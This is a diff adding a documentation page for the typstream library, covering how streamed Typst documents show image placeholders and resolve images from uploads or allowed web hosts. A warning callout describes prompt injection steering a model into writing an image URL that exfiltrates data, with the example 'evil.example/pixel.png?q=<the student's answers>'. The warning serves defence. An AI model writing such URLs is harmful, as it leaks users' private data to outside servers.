@@ -1,0 +1,131 @@
+---
+title: Images
+description: Show the images a document names, from your own files or the web, and what a document shows for an image it can't have.
+---
+
+Typst shows an image with `#image("path")`, and a figure gives it a caption. Typst reads images only from the
+document's files, never the network, and a model can only write a path, not an image's bytes. So typstream gives you
+two things:
+
+- **A placeholder, always.** An image the document has no file for shows as a box with the file's name. The call's
+  `width`, `height`, `fit` and `alt`, and a figure's caption, still apply, so the page keeps its layout.
+- **A way to fill images in, if you want it.** A `resolveImage` function gives the bytes for a path: your own uploads,
+  or URLs from hosts you allow with `fetchImages`.
+
+<TypstPreview target="paged" height={300}>
+
+```typst
+#figure(
+  image("https://upload.wikimedia.org/wikipedia/commons/plant-cell.svg", width: 60%),
+  caption: [A plant cell],
+)
+```
+
+</TypstPreview>
+
+Without a `resolveImage`, that is all a document shows, and nothing is fetched.
+
+## Images from your files
+
+When the images are yours (an upload, a diagram the app drew), pass them in `files`, keyed by the path the document
+uses:
+
+```tsx
+<Typstream source={text} files={{ "diagram.png": diagramBytes }} />
+```
+
+Tell the model which names it may use, in your prompt: "the student's photo is `photo.jpg`".
+
+## Images from the web
+
+`fetchImages` downloads the `http(s)` URLs a document names, from the hosts you allow:
+
+```tsx
+import { fetchImages, Typstream } from "typstream";
+
+const resolveImage = fetchImages({ hosts: ["upload.wikimedia.org", "*.example.edu"] });
+
+<Typstream source={text} isStreaming={streaming} resolveImage={resolveImage} />;
+```
+
+(It comes from `@typstream/engine/images`; `typstream` re-exports it.) As the document streams in, the client finds
+each image path once its string is complete. Until the image arrives, the placeholder shows; then the document
+compiles again with the image.
+
+- **Hosts are required.** A URL from another host isn't fetched; its placeholder stays, and its diagnostic says the
+  host isn't allowed. `"*"` allows any host, but read the next section first.
+- **No credentials.** Requests go without cookies or a referrer. The host must allow cross-origin requests, as image
+  CDNs usually do.
+- **Through your server.** `proxy` fetches another URL instead, with the page's credentials. Your server can then
+  cache and resize images, check them, and reach hosts that don't allow cross-origin requests:
+
+  ```ts
+  fetchImages({ hosts: ["*"], proxy: (url) => `/api/image?url=${encodeURIComponent(url)}` });
+  ```
+
+- **What it accepts.** PNG, JPEG, GIF, WebP and SVG, recognised by their bytes, not their extension, up to `maxBytes`
+  (10 MB) and within `timeoutMs` (15 s).
+- **Once per URL.** A resolver downloads each URL once for every document that asks, for as long as it lives. Create it
+  once, outside your components.
+
+<Callout type="warn" title="An image URL can leak what the model read">
+  A model can be steered, through anything it reads, into writing an image URL that carries data to someone else's
+  server: `https://evil.example/pixel.png?q=<the student's answers>`. The page fetches it as soon as the string is
+  complete. Allow only hosts you trust, or use a proxy that does.
+</Callout>
+
+## Your own resolver
+
+`resolveImage` can be any function from a path to bytes. Return `null` to leave the image missing; throw to say why it
+failed. It is called once per path and document, and its `signal` aborts when the document goes away:
+
+```tsx
+const resolveImage: ImageResolver = async (path, { signal }) => {
+  if (path.startsWith("upload:")) {
+    const res = await fetch(`/api/uploads/${path.slice(7)}`, { signal });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    return new Uint8Array(await res.arrayBuffer());
+  }
+  return fetchFromWeb(path, { signal });
+};
+const fetchFromWeb = fetchImages({ hosts: ["upload.wikimedia.org"] });
+```
+
+The path is exactly what the document wrote. Paths outside the document (`../x.png`) aren't asked for, and neither are
+paths the document's `files` already have.
+
+## Full-width images
+
+An image is as wide as Typst's `width` says: `image("…", width: 100%)` fills the line. To make every image full width
+without asking the model, set it in the preamble; a width the model gives a call still wins:
+
+```tsx
+<Typstream source={text} preamble="#set image(width: 100%)" resolveImage={resolveImage} />
+```
+
+The placeholder follows the same rule, so it is full width too. Heights follow the image's proportions, in both
+targets. An image without a `width` is never wider than the element: in the HTML target a larger one shrinks to fit.
+
+## What the document reports
+
+An image the document can't show is still a problem in it, so its diagnostic stays:
+
+| The image | Diagnostic |
+| --- | --- |
+| is loading | `info`: `image "…" is loading` |
+| failed (the resolver threw) | `image "…" failed to load (reason)` |
+| has no file, and nothing resolves it | Typst's `file not found (searched at /…)` |
+
+While the document streams, these are `info` diagnostics, like every problem typstream works around. In the finished
+document they are errors (except while loading), so a [fix loop](/docs/guides/server-fix-loop) can ask the model for
+another image or none.
+
+A path held in a variable (`#let src = "cat.png"`, then `#image(src)`) shows a placeholder too, but isn't resolved:
+only strings written in the `image` call are. So is a file that isn't the format its extension says, such as a `.png`
+URL that sends a JPEG: Typst then goes by its content.
+
+## See also
+
+- [Security](/docs/guides/security)
+- [`@typstream/engine/images`](/docs/reference/engine#typstreamengineimages)
+- [Prompting](/docs/guides/prompting)
